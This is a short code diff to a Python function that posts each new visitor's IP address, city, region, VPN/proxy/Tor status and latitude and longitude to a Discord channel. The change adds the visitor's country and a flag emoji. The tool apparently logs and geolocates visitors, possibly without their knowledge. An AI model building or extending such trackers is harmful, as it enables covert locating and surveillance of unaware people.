@@ -39,7 +39,7 @@ def send_ip_to_discord(ip, data):
         # Use the bot's API to send the message
         asyncio.run_coroutine_threadsafe(
             # Format the message with the IP and location data
-            channel.send(f"New visitor IP: `{ip}`\n{data["location"]["city"]}, {data["location"]["region"]}\nIs VPN: {data["security"]["is_vpn"]}\nIs Proxy: {data["security"]["is_proxy"]}\nIs Tor: {data["security"]["is_tor"]}\nIs Mobile: {data["security"]["is_mobile"]}\nLatitude: {data["location"]["latitude"]}\nLongitude: {data["location"]["longitude"]}"),
+            channel.send(f"New visitor IP: `{ip}`\n{data["location"]["city"]}, {data["location"]["region"]}\nCountry: {data["location"]["country"]} {data["flag"]["emoji"]}\nIs VPN: {data["security"]["is_vpn"]}\nIs Proxy: {data["security"]["is_proxy"]}\nIs Tor: {data["security"]["is_tor"]}\nIs Mobile: {data["security"]["is_mobile"]}\nLatitude: {data["location"]["latitude"]}\nLongitude: {data["location"]["longitude"]}"),
             bot.loop
         )
     else:
